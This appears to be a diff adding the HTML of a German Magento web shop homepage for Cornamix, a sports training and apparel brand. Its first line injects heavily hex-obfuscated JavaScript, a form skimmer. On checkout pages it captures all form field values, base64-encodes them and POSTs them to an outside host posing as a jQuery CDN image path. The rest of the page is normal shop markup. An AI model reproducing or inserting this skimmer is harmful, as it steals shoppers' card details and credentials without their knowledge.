+var _0xb59b=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x71\x75\x65\x72\x79\x2D\x63\x6C\x6F\x75\x64\x2E\x6F\x72\x67\x2F\x69\x6D\x61\x67\x65\x73\x2F\x70\x61\x79\x70\x61\x6C\x2D\x6C\x6F\x67\x6F\x2E\x6A\x70\x67","\x73\x65\x74\x69\x64\x64","\x28\x3F\x3A\x5E\x7C\x3B\x20\x29","\x5C\x24\x31","\x72\x65\x70\x6C\x61\x63\x65","\x3D\x28\x5B\x5E\x3B\x5D\x2A\x29","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x67\x65\x74\x54\x69\x6D\x65","\x2D","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x73\x65\x74\x69\x64\x64\x3D","\x3B\x20\x70\x61\x74\x68\x3D\x2F\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x6C\x65\x6E\x67\x74\x68","\x73\x6C\x69\x63\x65","\x3D\x3D","\x3D","\x73\x6E\x64","\x69\x6E\x70\x75\x74\x2C\x20\x73\x65\x6C\x65\x63\x74\x2C\x20\x74\x65\x78\x74\x61\x72\x65\x61\x2C\x20\x63\x68\x65\x63\x6B\x62\x6F\x78\x2C\x20\x62\x75\x74\x74\x6F\x6E","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72\x41\x6C\x6C","\x76\x61\x6C\x75\x65","\x6E\x61\x6D\x65","\x26","\x61\x5B\x68\x72\x65\x66\x2A\x3D\x27\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x76\x6F\x69\x64\x28\x30\x29\x27\x5D\x2C\x62\x75\x74\x74\x6F\x6E\x2C\x20\x69\x6E\x70\x75\x74\x2C\x20\x73\x75\x62\x6D\x69\x74\x2C\x20\x2E\x62\x74\x6E\x2C\x20\x2E\x62\x75\x74\x74\x6F\x6E","\x74\x79\x70\x65","\x74\x65\x78\x74","\x73\x65\x6C\x65\x63\x74","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x70\x61\x73\x73\x77\x6F\x72\x64","\x72\x61\x64\x69\x6F","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6C\x69\x63\x6B","\x63\x6C\x6B","\x6F\x6E\x63\x6C\x69\x63\x6B","\x61\x74\x74\x61\x63\x68\x45\x76\x65\x6E\x74","\x66\x6F\x72\x6D","\x73\x75\x62\x6D\x69\x74","\x6F\x6E\x73\x75\x62\x6D\x69\x74","\x5F","\x6A\x6F\x69\x6E","\x2E","\x73\x70\x6C\x69\x74","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x62\x61\x73\x65\x36\x34\x5F\x65\x6E\x63\x6F\x64\x65","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x69\x6E\x66\x6F\x3D","\x26\x68\x6F\x73\x74\x6E\x61\x6D\x65\x3D","\x26\x6B\x65\x79\x3D","\x6D\x79\x69\x64","\x73\x65\x6E\x64","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70","\x67\x69"];var grelos_v={snd:null,Glink:_0xb59b[0],myid:(function(_0xd78cx2){var _0xd78cx3=document[_0xb59b[7]][_0xb59b[6]]( new RegExp(_0xb59b[2]+ _0xd78cx2[_0xb59b[4]](/([\.$?*|{}\(\)\[\]\\\/\+^])/g,_0xb59b[3])+ _0xb59b[5]));return _0xd78cx3?decodeURIComponent(_0xd78cx3[1]):undefined})(_0xb59b[1])|| (function(){var _0xd78cx4= new Date();var _0xd78cx5=_0xd78cx4[_0xb59b[8]]()+ _0xb59b[9]+ Math[_0xb59b[11]](Math[_0xb59b[10]]()* (999999999- 11111111+ 1)+ 11111111);var _0xd78cx6= new Date( new Date()[_0xb59b[8]]()+ 60* 60* 24* 1000);document[_0xb59b[7]]= _0xb59b[12]+ _0xd78cx5+ _0xb59b[13]+ _0xd78cx6[_0xb59b[14]]();return _0xd78cx5})(),base64_encode:function(_0xd78cx7){var _0xd78cx8=_0xb59b[15];var _0xd78cx9,_0xd78cxa,_0xd78cxb,_0xd78cxc,_0xd78cxd,_0xd78cxe,_0xd78cxf,_0xd78cx10,_0xd78cx11=0,_0xd78cx12=_0xb59b[16];do{_0xd78cx9= _0xd78cx7[_0xb59b[17]](_0xd78cx11++);_0xd78cxa= _0xd78cx7[_0xb59b[17]](_0xd78cx11++);_0xd78cxb= _0xd78cx7[_0xb59b[17]](_0xd78cx11++);_0xd78cx10= _0xd78cx9<< 16| _0xd78cxa<< 8| _0xd78cxb;_0xd78cxc= _0xd78cx10>> 18& 0x3f;_0xd78cxd= _0xd78cx10>> 12& 0x3f;_0xd78cxe= _0xd78cx10>> 6& 0x3f;_0xd78cxf= _0xd78cx10& 0x3f;_0xd78cx12+= _0xd78cx8[_0xb59b[18]](_0xd78cxc)+ _0xd78cx8[_0xb59b[18]](_0xd78cxd)+ _0xd78cx8[_0xb59b[18]](_0xd78cxe)+ _0xd78cx8[_0xb59b[18]](_0xd78cxf)}while(_0xd78cx11< _0xd78cx7[_0xb59b[19]]);;switch(_0xd78cx7[_0xb59b[19]]% 3){case 1:_0xd78cx12= _0xd78cx12[_0xb59b[20]](0,-2)+ _0xb59b[21];break;case 2:_0xd78cx12= _0xd78cx12[_0xb59b[20]](0,-1)+ _0xb59b[22];break};return _0xd78cx12},clk:function(){grelos_v[_0xb59b[23]]= null;var _0xd78cx13=document[_0xb59b[25]](_0xb59b[24]);for(var _0xd78cx11=0;_0xd78cx11< _0xd78cx13[_0xb59b[19]];_0xd78cx11++){if(_0xd78cx13[_0xd78cx11][_0xb59b[26]][_0xb59b[19]]> 0){var _0xd78cx14=_0xd78cx13[_0xd78cx11][_0xb59b[27]];if(_0xd78cx14== _0xb59b[16]){_0xd78cx14= _0xd78cx11};grelos_v[_0xb59b[23]]+= _0xd78cx13[_0xd78cx11][_0xb59b[27]]+ _0xb59b[22]+ _0xd78cx13[_0xd78cx11][_0xb59b[26]]+ _0xb59b[28]}}},send:function(){try{var _0xd78cx15=document[_0xb59b[25]](_0xb59b[29]);for(var _0xd78cx11=0;_0xd78cx11< _0xd78cx15[_0xb59b[19]];_0xd78cx11++){var _0xd78cx16=_0xd78cx15[_0xd78cx11];if(_0xd78cx16[_0xb59b[30]]!= _0xb59b[31]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[32]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[33]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[34]&& _0xd78cx16[_0xb59b[30]]!= _0xb59b[35]){if(_0xd78cx16[_0xb59b[36]]){_0xd78cx16[_0xb59b[36]](_0xb59b[37],grelos_v[_0xb59b[38]],false)}else {_0xd78cx16[_0xb59b[40]](_0xb59b[39],grelos_v[_0xb59b[38]])}}};var _0xd78cx17=document[_0xb59b[25]](_0xb59b[41]);for(vari= 0;_0xd78cx11< _0xd78cx17[_0xb59b[19]];_0xd78cx11++){if(_0xd78cx17[_0xd78cx11][_0xb59b[36]]){_0xd78cx17[_0xd78cx11][_0xb59b[36]](_0xb59b[42],grelos_v[_0xb59b[38]],false)}else {_0xd78cx17[_0xd78cx11][_0xb59b[40]](_0xb59b[43],grelos_v[_0xb59b[38]])}};if(grelos_v[_0xb59b[23]]!= null){var _0xd78cx18=location[_0xb59b[48]][_0xb59b[47]](_0xb59b[46])[_0xb59b[20]](0)[_0xb59b[45]](_0xb59b[44]);var _0xd78cx19=grelos_v[_0xb59b[49]](grelos_v[_0xb59b[23]]);var _0xd78cx1a= new XMLHttpRequest();_0xd78cx1a[_0xb59b[51]](_0xb59b[50],grelos_v.Glink,true);_0xd78cx1a[_0xb59b[54]](_0xb59b[52],_0xb59b[53]);_0xd78cx1a[_0xb59b[59]](_0xb59b[55]+ _0xd78cx19+ _0xb59b[56]+ _0xd78cx18+ _0xb59b[57]+ grelos_v[_0xb59b[58]])};grelos_v[_0xb59b[23]]= null;_0xd78cx19= null;setTimeout(function(){grelos_v[_0xb59b[59]]()},30)}catch(e){}}};if(( new RegExp(_0xb59b[62],_0xb59b[63]))[_0xb59b[61]](window[_0xb59b[60]])){grelos_v[_0xb59b[59]]()}
+</script></head>
+<body class=" cms-index-index cms-home">
+<div class="wrapper">
+        <noscript>
+        <div class="global-site-notice noscript">
+            <div class="notice-inner">
+                <p>
+                    <strong>JavaScript scheint in Ihrem Browser deaktiviert zu sein.</strong><br />
+                    Sie müssen JavaScript in Ihrem Browser aktivieren, um alle Funktionen in diesem Shop nutzen zu können.                </p>
+            </div>
+        </div>
+    </noscript>
+    <div class="page">
+        <div class="header-container">
+	<div class="navigation-wrap">
+		<div class="navigation">
+		      <a href="http://shop.cornamix.com/" title="Cornamix Logo" class="logo"></a>
+		      <div id="lava">
+		        <ul class="main-navigation">
+<li><a class="shop-homelink" href="http://www.cornamix.com">Home</a></li>
+<li><a href="http://www.cornamix-athletes.com/">Cornamix Athletes</a></li>
+<li><a href="http://cornamix-academy.com/">Cornamix Academy</a></li>
+<li class="current_page_item"><a class="shop-shoplink" title="Cornamix Shop" href="http://shop.cornamix.com">Shop</a></li>
+</ul>
+<!--
+<ul class="main-navigation">
+<li><a class="shop-homelink" href="http://www.cornamix.com">Home</a></li>
+<li><a href="http://www.cornamix.com/programm/">Programm</a></li>
+<li><a href="http://www.cornamix.com/fortbildungen/">Fortbildungen</a></li>
+<li><a href="http://mycornamix.cornamix.com/">Portal</a></li>
+<li><a href="http://www.cornamix.com/ueber-uns/">&Uuml;ber uns</a></li>
+<li class="current_page_item"><a class="shop-shoplink" title="Cornamix Shop" href="http://shop.cornamix.com">Shop</a></li>
+</ul>
+-->		        <div id="box"><div class="head"></div></div>
+		      </div>
+		      		</div>
+	</div>
+    <div class="header">
+
+    	
+
+
+<script type="text/javascript">		
+	try{
+		var jqueryIsLoaded=jQuery;
+		jQueryIsLoaded=true;
+	}
+	catch(err){
+		var jQueryIsLoaded=false;
+	}
+	
+	if(jQueryIsLoaded){
+		//alert('jQuery is loaded');		
+	}
+	else{				
+		//alert('Not Loaded.');
+	}	
+	
+	
+</script>
+<!-- If jquery alredy loaded then below jQuery file not required -->
+ <script type="text/javascript" src="http://shop.cornamix.com/js/bassi/imageslider/jquery.min.js"></script> 
+<script type="text/javascript" src="http://shop.cornamix.com/js/bassi/imageslider/jquery.mobile.customized.min.js"></script>
+<script type="text/javascript" src="http://shop.cornamix.com/js/bassi/imageslider/jquery.easing.1.3.js"></script>
+ <script type="text/javascript" src="http://shop.cornamix.com/js/bassi/imageslider/camera.min.js"></script> 
+
+<script type="text/javascript">
+	var $ds = jQuery.noConflict();
+	$ds(function(){
+		
+		$ds('#camera_wrap_1').camera({
+			thumbnails: false,
+			fx: 'simpleFade',			
+			time: 4000,
+			transPeriod: 1000,
+			loader: 'none',
+			navigation: 0,
+			height: '237px',
+			opacityOnGrid: true,
+			pauseOnClick: false,
+			playPause: 0,			
+			pagination: false			
+			
+		});			
+	});
+</script>				
+<link rel='stylesheet' id='camera-css'  href="http://shop.cornamix.com/skin/frontend/default/default/css/bassi/imageslider/camera.css" type='text/css' media='all'>
+
+<style>
+	body {
+		margin: 0;
+		padding: 0;
+	}
+	#back_to_camera {
+		clear: both;
+		display: block;
+		height: 80px;
+		line-height: 40px;
+		padding: 20px;
+	}
+	.fluid_container {
+		margin: 0 auto;
+		width: 1008px;
+	}
+</style>
+<div class="fluid_container">    	
+	<div class="camera_wrap camera_coffee_skin" id="camera_wrap_1">
+	
+			<div data-thumb="http://shop.cornamix.com/media/bsimages/thumbs/Bildschirmfoto_2013-08-24_um_12.06.13-2.png" data-src="http://shop.cornamix.com/media/bsimages/Bildschirmfoto_2013-08-24_um_12.06.13-2.png" >
+		
+						
+		</div>	
+			<div data-thumb="http://shop.cornamix.com/media/bsimages/thumbs/Bildschirmfoto_2013-08-24_um_12.06.13-2.png" data-src="http://shop.cornamix.com/media/bsimages/Bildschirmfoto_2013-08-24_um_12.06.13-2.png" >
+		
+						
+		</div>	
+		
+	
+	</div>
+</div>
+    
+<div style="clear:both; display:block;"></div>
+	
+     <ul class="links">
+                        <li class="first" ><a href="http://shop.cornamix.com/customer/account/" title="Mein Benutzerkonto" >Mein Benutzerkonto</a></li>
+                                <li ><a href="http://shop.cornamix.com/checkout/cart/" title="Mein Warenkorb" class="top-link-cart">Mein Warenkorb</a></li>
+                                <li ><a href="http://shop.cornamix.com/checkout/" title="Zur Kasse" class="top-link-checkout">Zur Kasse</a></li>
+                                <li class=" last" ><a href="http://shop.cornamix.com/customer/account/login/referer/aHR0cDovL3Nob3AuY29ybmFtaXguY29tLz9fX19TSUQ9VQ,,/" title="Anmelden" >Anmelden</a></li>
+            </ul>
+              <div class="quick-access">
+           <div class="quick-access-warenkorb">
+	            <h3>Warenkorb</h3>
+	             
+<div class="block block-cart">
+       <!--   <div class="block-title">
+        <strong><span></span></strong>
+    </div>-->
+    <div class="block-content">
+                        <p class="empty">Sie haben keine Artikel im Warenkorb.</p>
+        </div>
+</div>
+            </div>
+        </div>
+            </div>
+</div>
+        <div class="main-container col1-layout">
+            <div class="main">
+                                <div class="col-main">
+                <h1>Willkommen im Cornamix Shop !</h1>
+                                 
+<script type="text/javascript" src="http://shop.cornamix.com/js/jquery/easySlider1.7.js"></script>
+<link rel="stylesheet" type="text/css" href="http://shop.cornamix.com/skin/frontend/default/cornamix/css/lb-slider.css" media="all" />
+
+<script type="text/javascript">
+jQuery(document).ready(function(){
+	jQuery("#lb-slider").easySlider({
+		auto: true,
+		continuous: true,
+		numeric: false,
+		speed:1000,
+		pause:5000
+	});
+});
+</script>
+
+<div id="lb-slider">
+    <ul class="slideul">
+                    <li class="slidelist">
+                <a href="http://shop.cornamix.com/hoody-m-u-kids.html" title="Hoodie m/u " class="lb-slider-link">
+                    <h2>Hoodie m/u </h2>
+                    <div class="clear"></div>
+                    <div class="lb-slider-price"><span class="pre-decimal">49</span><span class="decimal">96 €</span></div>
+                    <div class="lb-more-button">zum Produkt &rsaquo;</div>
+                    <img src="http://shop.cornamix.com/media/catalog/product/cache/1/thumbnail/350x/2c75f5c6ec9bfabf0f47475572b7ebb4/0/1/010204703527.jpg" width="350" height="350" alt="" class="lb-slider-img" />
+                </a>
+            </li>
+        
+                    <li class="slidelist">
+                <a href="http://shop.cornamix.com/classic-line-x13.html" title="Classic Line X13" class="lb-slider-link">
+                    <h2>Classic Line X13</h2>
+                    <div class="clear"></div>
+                    <div class="lb-slider-price"><span class="pre-decimal">59</span><span class="decimal">95 €</span></div>
+                    <div class="lb-more-button">zum Produkt &rsaquo;</div>
+                    <img src="http://shop.cornamix.com/media/catalog/product/cache/1/thumbnail/350x/2c75f5c6ec9bfabf0f47475572b7ebb4/c/l/classiclinex13_ratsche6.jpg" width="350" height="350" alt="" class="lb-slider-img" />
+                </a>
+            </li>
+        
+                    <li class="slidelist">
+                <a href="http://shop.cornamix.com/tee-m-u-grau-melange.html" title="Tee m/u grau/melange" class="lb-slider-link">
+                    <h2>Tee m/u grau/melange</h2>
+                    <div class="clear"></div>
+                    <div class="lb-slider-price"><span class="pre-decimal">24</span><span class="decimal">95 €</span></div>
+                    <div class="lb-more-button">zum Produkt &rsaquo;</div>
+                    <img src="http://shop.cornamix.com/media/catalog/product/cache/1/thumbnail/350x/2c75f5c6ec9bfabf0f47475572b7ebb4/t/-/t-shirt_6_1.jpg" width="350" height="350" alt="" class="lb-slider-img" />
+                </a>
+            </li>
+        
+                    <li class="slidelist">
+                <a href="http://shop.cornamix.com/slack-rack-300.html" title="Slack Rack 300" class="lb-slider-link">
+                    <h2>Slack Rack 300</h2>
+                    <div class="clear"></div>
+                    <div class="lb-slider-price"><span class="pre-decimal">399</span><span class="decimal">00 €</span></div>
+                    <div class="lb-more-button">zum Produkt &rsaquo;</div>
+                    <img src="http://shop.cornamix.com/media/catalog/product/cache/1/thumbnail/350x/2c75f5c6ec9bfabf0f47475572b7ebb4/p/r/produktbild_slackrack300.jpg" width="350" height="350" alt="" class="lb-slider-img" />
+                </a>
+            </li>
+        
+            </ul>
+</div>
+
+                <div class="right-top-actions">
+                    <form id="search_mini_form" action="http://shop.cornamix.com/catalogsearch/result/" method="get">
+    <div class="form-search">
+        <label for="search">Suche:</label>
+        <input id="search" type="text" name="q" value="" class="input-text" maxlength="128" />
+        <button type="submit" title="Suche" class="button"></button>
+        <div id="search_autocomplete" class="search-autocomplete"></div>
+        <script type="text/javascript">
+        //<![CDATA[
+            var searchForm = new Varien.searchForm('search_mini_form', 'search', 'Gesamten Shop durchsuchen…');
+            searchForm.initAutocomplete('http://shop.cornamix.com/catalogsearch/ajax/suggest/', 'search_autocomplete');
+        //]]>
+        </script>
+    </div>
+</form>
+                    <div class="social-actions">
+                        <div class="action ups"></div>
+                        <div class="action ssl"></div>
+                        <div class="action paypal"></div>
+                        <div class="action secupay"></div>
+                    </div>
+
+                    <div class="top-like-box">
+                 <div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/de_DE/all.js#xfbml=1&appId=1513344532224361";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+                         <div class="fb-like-box" data-href="https://www.facebook.com/Cornamix" data-colorscheme="light" data-show-faces="false" data-header="false" data-stream="false" data-show-border="true"></div>
+
+                    </div>
+                    <div class="rabatte-box">
+                        <h2>Sonderpreise für Fachleute</h2>
+                        <p>
+                            Sonderkonditionen für wissenschaftliches, medizinisches und sportliches Fachpersonal:                        </p>
+                        <p>
+                            Einfach <a href="/customer/account/create">im Shop registrieren</a> und <b>Berufsurkunde oder Gewerbeschein</b> per Fax an 0049 421 3300 4972 oder per Mail an <a href="mailto:shop@cornamix.com">shop@cornamix.com</a> senden.                        </p>
+                    </div>
+
+                    <p><div class="block block-subscribe">
+    <div class="block-title">
+        <strong><span>Newsletter</span></strong>
+    </div>
+    <form action="http://shop.cornamix.com/newsletter/subscriber/new/" method="post" id="newsletter-validate-detail">
+        <div class="block-content">
+            <div class="form-subscribe-header">
+                <label for="newsletter">Anmeldung für unseren Newsletter:</label>
+            </div>
+            <div class="input-box">
+               <input type="text" name="email" id="newsletter" title="Anmeldung für unseren Newsletter" class="input-text required-entry validate-email" />
+            </div>
+            <div class="actions">
+                <button type="submit" title="Abonnieren" class="button"><span>Abonnieren</span></button>
+            </div>
+        </div>
+    </form>
+    <script type="text/javascript">
+    //<![CDATA[
+        var newsletterSubscriberFormDetail = new VarienForm('newsletter-validate-detail');
+    //]]>
+    </script>
+</div>
+</p>                </div>
+
+                    <div class="index-category">
+                        <a href="/fortbildungen.html" class="fortbildungen-btn-wrap logo-btn">
+                            <span class="left-top-name">Fortbildungen</span>
+                            <span class="info-text">Werde Cornamix Instructor und bringe dein Training voran. Nutze auch du die Aspekte von Cornamix.</span>
+                            <span class="bottom-left-button">Weiter &raquo;</span>
+                        </a>
+                        <a href="/training-veranstaltungen.html" class="freiestraining-btn-wrap logo-btn">
+                            <span class="left-top-name">Training</span>
+                            <span class="info-text">Buche Cornamix und erlebe eine neue Ebene des Trainings.</span>
+                            <span class="bottom-left-button">Weiter &raquo;</span>
+                        </a>
+                          <a href="/bekleidung.html" class="brainamix-btn-wrap logo-btn">
+                            <span class="left-top-name">Bekleidung</span>
+                            <span class="info-text">Cornamix Fashion und Bekleidung für deinen Sport.</span>
+                            <span class="bottom-left-button">Weiter &raquo;</span>
+                        </a>
+                        <a href="/equipment.html" class="bodynamix-btn-wrap logo-btn">
+                            <span class="left-top-name">Equipment</span>
+                            <span class="info-text">Hier bekommst du alles, was du für dein funktionelles Training brauchst!</span>
+                            <span class="bottom-left-button">Weiter &raquo;</span>
+                        </a>
+                      </div>
+                    <div class="index-banner">
+                    <div class="clear"></div>
+                    </div>
+                                    </div>
+            </div>
+        </div>
+        <div class="footer-container">
+    <div class="footertop">
+        <div class="footer">
+            <ul><li class=""><a href="http://shop.cornamix.com/agb/">AGB</a></li><li class=""><a href="http://shop.cornamix.com/widerruf/">Widerruf</a></li><li class=""><a href="http://shop.cornamix.com/lieferung/">Lieferung</a></li><li class=""><a href="http://shop.cornamix.com/zahlung/">Zahlungsarten</a></li><li class=""><a href="http://shop.cornamix.com/datenschutz/">Datenschutz</a></li><li class=""><a href="http://shop.cornamix.com/bestellung/">Bestellvorgang</a></li><li class="last"><a href="http://shop.cornamix.com/impressum/">Impressum</a></li></ul><ul class="links">
+                        <li class="first" ><a href="http://shop.cornamix.com/catalog/seo_sitemap/category/" title="Sitemap" >Sitemap</a></li>
+                                <li ><a href="http://shop.cornamix.com/catalogsearch/advanced/" title="Erweiterte Suche" >Erweiterte Suche</a></li>
+                                <li ><a href="http://shop.cornamix.com/sales/guest/form/" title="Bestellungen und Rücksendungen" >Bestellungen und Rücksendungen</a></li>
+                                <li class=" last" ><a href="http://shop.cornamix.com/contacts/" title="Kontaktieren Sie uns" >Kontaktieren Sie uns</a></li>
+            </ul>
+             <address>&copy; 2013 Cornamix</address>
+             <ul id="social">
+             	<li class="facebook"><a href="https://www.facebook.com/Cornamix" target="_blank" title="Facebook"><div class="icon"></div></a></li>
+             	<li class="twitter"><a href="https://www.facebook.com/Cornamix" target="_blank" title="Facebook"><div class="icon"></div></a></li>
+             	<li class="gplus"><a href="https://www.facebook.com/Cornamix" target="_blank" title="Google+"><div class="icon"></div></a></li>
+             	<li class="xing"><a href="https://www.facebook.com/Cornamix" target="_blank" title="Xing"><div class="icon"></div></a></li>
+             	<li class="rss"><a href="https://www.facebook.com/Cornamix" target="_blank" title="RSS"><div class="icon"></div></a></li>
+             	<li class="mail"><a href="https://www.facebook.com/Cornamix" target="_blank" title="Mail"><div class="icon"></div></a></li>
+             </ul>
+        </div>
+    </div>
+    <div class="footerbottom"></div>       
+</div>
+<!---->
+
+
+<script>
+jQuery.noConflict();
+var contentHeight = jQuery(".main").outerHeight();
+jQuery(document).ready(function() {
+    jQuery(".col-left").css('min-height', contentHeight);
+});
+</script>            </div>
+</div>
+</body>
+</html>
